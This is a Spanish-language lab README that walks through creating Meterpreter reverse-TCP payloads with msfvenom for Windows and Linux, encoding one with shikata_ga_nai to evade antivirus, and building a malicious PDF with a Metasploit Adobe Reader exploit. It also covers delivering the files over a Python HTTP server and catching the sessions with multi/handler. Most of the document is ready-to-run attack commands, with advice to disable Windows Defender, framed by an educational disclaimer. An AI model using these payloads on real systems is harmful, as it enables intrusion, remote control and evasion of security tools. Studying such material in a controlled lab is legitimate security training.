# 🚀 Payload Creation and Explotation Lab


## 📚 Descripción
En esta documentación se detalla técnicas de creación y uso de payloads maliciosos para realizar pruebas de penetración y explotación en diferentes sistemas operativos (Windows y Linux). A través de estas prácticas, se busca entender cómo funcionan los troyanos, los payloads codificados, y cómo se pueden utilizar herramientas como **MSFVenom** y **Metasploit** para establecer conexiones reversas y tomar control de sistemas vulnerables.


## 📌 Contenidos
- [Descripción](#descripción)
- [Advertencia](#advertencia)
- [Requisitos](#requisitos)
- [Uso](#uso)
  - [Payload](#creación-de-payload-con-msfvenom)
  - [Payload con Encoder](#payload-con-encoder)
  - [Payload para Linux](#payload-para-linux)
  - [Payload en un PDF](#payload-en-un-pdf)


## ⛔ Advertencia
Este repositorio y su contenido han sido creados **exclusivamente con fines educativos, académicos y de investigación en ciberseguridad.**

❌ **Prohibido el uso malintencionado:** El uso de este código para atacar sistemas sin la autorización explícita de sus propietarios **está estrictamente prohibido** y puede violar leyes locales, nacionales e internacionales.

✅ **Entornos controlados:** Se recomienda ejecutar este exploit **únicamente en entornos de pruebas controlados y sistemas que poseas o cuentes con permiso explícito para auditar.**

⚖️ **Responsabilidad:** El autor de este repositorio **no se hace responsable** de cualquier daño, pérdida o acción legal derivada del uso inapropiado de este código.

**Al utilizar este repositorio, aceptas y comprendes estas condiciones.** Si no estás de acuerdo, por favor, no clones ni utilices este código.

**La ciberseguridad es una responsabilidad compartida. Úsalo con ética y respeto. 🚀**


## 🔨 Requisitos
Antes de comenzar, asegúrate de tener lo siguiente:
- **Máquina objetivo:**: Windows 10, Ubuntu Desktop 24.04

- **Máquina atacante:** Kali Linux
- **Herramientas necesarias:** Metasploit, MSFVenom, Nmap, Python

## 🎯 Uso
### Creación de Payload con **MSFVenom**
El payload será **Meterpreter + Reverse TCP**, lo que permitirá el control remoto de la máquina víctima.
Ejecuta la siguiente comando en Kali Linux.

```
msfvenom –-platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.10.4
LPORT=1111 -f exe > payload1.exe
```
<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/Payload-Creation/media/img/creacion_payload1png alt="creacion_payload1" style="border-radius: 10px;">
</p>

<br>


**Explicación de los parámetros:**
- **--platform windows:** Especifica que el payload es para Windows.
- **-p windows/meterpreter/reverse_tcp:** Define el payload Meterpreter Reverse TCP, que permitirá conectarse a la víctima.
- **LHOST=192.168.10.4:** Dirección IP de la máquina atacante, que recibirá la conexión.
- **LPORT=1111:** Puerto en el que la máquina atacante estará escuchando la conexión.
- **-f exe:** Especifica el formato del archivo como ejecutable (.exe) para Windows.
- **> payload1.exe:** Guarda el archivo generado con el nombre payload1.exe.


Para recibir la conexión de la víctima, debes configurar Metasploit para que actúe como handler y escuche en el puerto 1111.
Abre **Metasploit** i selecciona el módulo de escucha **multi/handler**
```
msf6 > use exploit/multi/handler
```
<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/Payload-Creation/media/img/multi_handler.png" alt="multi_handler" style="border-radius: 10px;">
</p>

<br>

Configura el payload i ponte en escucha.
```
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set lhost 192.168.10.4
msf6 > set lport 1111
msf6 > run
```
<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/Payload-Creation/media/img/config_payload1.png" alt="config_payload1" style="border-radius: 10px;">
</p>

<br>

Para transferir el archivo **payload1.exe** a la máquina víctima, usaremos un **servidor HTTP simple con Python** en la máquina atacante. Esto iniciará un **servidor web en el puerto 8000**, permitiendo descargar el archivo desde la máquina víctima.

```
python -m http.server
```
<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/Payload-Creation/media/img/http_server.png" alt="http_server" style="border-radius: 10px;">
</p>

<br>


En la máquina Windows, abre el navegador y accede a la IP de la máquina atacante. Para evitar que Windows Defender o cualquier antivirus bloquee el archivo, es posible que debas desactivarlos temporalmente.
```
192.168.10.4:8000
```
<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/Payload-Creation/media/img/navegador.png" alt="navegador" style="border-radius: 10px;">
</p>

<br>

Busca el archivo descargado **payload1.exe** y haz doble clic para ejecutarlo.

Una vez que la víctima ejecuta **payload1.exe**, en la máquina atacante, donde Metasploit está escuchando en el puerto **1111**, debería aparecer una sesión activa en Meterpreter. Puedes ejecutar los siguientes comandos para obtener información sobre la máquina víctima.

```
meterpreter > sysinfo 
meterpreter > getuid
```
<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/Payload-Creation/media/img/sysinfo_getuid.png" alt="sysinfo_getuid" style="border-radius: 10px;">
</p>

<br>

### Payload con Encoder
En este caso, vamos a crear un troyano con un **payload compuesto (Meterpreter + Reverse TCP)** utilizando **MSFVenom**, pero esta vez vamos a codificar el payload con el encoder **Shikata_ga_nai**. Este encoder se utiliza para hacer que el payload sea más difícil de detectar por los sistemas de seguridad, como antivirus.

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.4 LPORT=2222 -e x86/shikata_ga_nai -f exe -o payload2.exe
```
<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/Payload-Creation/media/img/creacion_payload2.png" alt="creacion_payload2" style="border-radius: 10px;">
</p>

<br>

**Explicación del nuevo parámetro:**
- **-e x86/shikata_ga_nai:**	Utiliza el encoder Shikata_ga_nai, un encoder polimórfico que ayuda a evadir la detección de antivirus.

> [!NOTE]
> El encoder Shikata_ga_nai es un encoder polimórfico que permite modificar el código del payload en múltiples formas. Esto hace que sea más difícil para los sistemas antivirus detectarlo, lo que mejora la posibilidad de que el payload pase desapercibido.

Ponte en escucha con Metasploit usando el exploit handler con el mismo payload y puerto 2222

Inicia el servidor HTTP en la máquina atacante y descarga el archivo en la víctima desde el navegador.

**¿Ha sido detectado el payload por Windows Defender?**

Si estás utilizando Windows Defender o un antivirus, es posible que detecte el payload debido a su naturaleza maliciosa, incluso con el encoder **Shikata_ga_nai**. En muchos casos, los antivirus y Windows Defender pueden detectar los payloads generados por **MSFVenom**.
Si quieres continuar con el proceso para probarlo desactiva **Windows Defender** temporalmente i ejecuta el archivo.


### Payload para Linux
Se generará un **payload para Linux** que establecerá una conexión inversa (reverse shell) desde la máquina víctima a la máquina atacante. Se usará **Ubuntu 24.04.2 LTS** como sistema objetivo.

```
msfvenom --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.10.4 LPORT=3333 -e x86/shikata_ga_nai -f elf -o payloadLinux.elf
```
<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/Payload-Creation/media/img/creacion_payload3.png" alt="creacion_payload3" style="border-radius: 10px;">
</p>

<br>

Inicia el servidor HTTP en la máquina atacante y descarga el archivo en la víctima desde el navegador.

Ponte en escucha con Metasploit usando el exploit handler con el mismo payload y puerto 3333

Una vez descargado el archivo en la máquina Ubuntu, es necesario darle permisos de ejecución y ejecutarlo:
```
chmod +x payloadLinux.elf
./payloadLinux.elf
```
<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/Payload-Creation/media/img/permisos.png" alt="permisos" style="border-radius: 10px;">
</p>

<br>

Si todo ha funcionado correctamente, en Kali Linux dentro de Metasploit deberíamos ver una sesión activa de **Meterpreter**, lo que indica que la víctima ha ejecutado el payload con éxito. Realiza algunas pruebas básicas dentro de Meterpreter.


### Payload en un PDF
En este ejercicio, se generará un **PDF malicioso** que, al ser abierto en una versión vulnerable de **Adobe Reader (8.x o 9.x)**, ejecutará un payload y establecerá una conexión reversa hacia la máquina atacante.

Abrimos Metasploit y buscamos exploits relacionados con PDF y Adobe Reader.
```
msf6 > search adobe_pdf
```
<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/Payload-Creation/media/img/search_adobe.png" alt="search_adobe" style="border-radius: 10px;">
</p>

<br>

Entre los resultados, seleccionamos un exploit adecuado, por ejemplo.
```
msf6 > use exploit/windows/fileformat/adobe_pdf_embedded_exe
```
<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/Payload-Creation/media/img/use_exploit.png" alt="use_exploit" style="border-radius: 10px;">
</p>

<br>

Una vez seleccionado el exploit, configuramos los parámetros:
```
msf6 > set filename Actividad.pdf
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set lhost 192.168.10.4
msf6 > set lport 4444
```
<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/Payload-Creation/media/img/configuracion_exploit.png" alt="configuracion_exploit" style="border-radius: 10px;">
</p>

<br>

Ejecutamos el exploit para generar el archivo PDF malicioso. El archivo **Actividad.pdf** se generará en la siguiente ruta por defecto.
```
/home/secomu/.msf4/local/Actividad.pdf
```
<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/Payload-Creation/media/img/run.png" alt="run" style="border-radius: 10px;">
</p>

<br>

Para facilitar su acceso, copiamos el PDF a un directorio más accesible:
```
cp /home/secomu/.msf4/local/Activitat.pdf .
```
<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/Payload-Creation/media/img/cp.png" alt="cp" style="border-radius: 10px;">
</p>

<br>

Ponte en escucha con Metasploit usando el exploit handler con el mismo payload y puerto 4444

Inicia el servidor HTTP en la máquina atacante y descarga el archivo en la víctima desde el navegador.

Si la víctima abre el archivo PDF en una versión vulnerable de Adobe Reader, se ejecutará el payload y la máquina atacada se conectará automáticamente a Metasploit, otorgando una sesión Meterpreter.
<p align="center">
  <img src="https://github.com/ElChe1/Explotation-Lab/blob/main/Payload-Creation/media/img/adobe_reader.png" alt="adobe_reader" style="border-radius: 10px;">
</p>

<br>
